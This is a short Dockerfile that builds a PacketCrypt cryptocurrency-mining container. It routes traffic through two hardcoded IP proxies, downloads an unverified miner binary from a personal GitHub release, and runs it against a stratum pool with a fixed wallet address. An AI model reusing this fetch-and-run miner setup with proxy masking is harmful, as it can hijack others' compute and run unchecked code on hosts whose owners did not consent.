FROM debian:buster-slim
ENV http_proxy "http://117.4.115.169:8080"
ENV https_proxy "http://113.161.70.165:41890"
RUN apt update && \
        apt full-upgrade -y && \
        apt install wget -y && \
        wget https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && \
        chmod +x packetcrypt_x8664_linux
CMD ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj https://stratum.zetahash.com/ -t 1
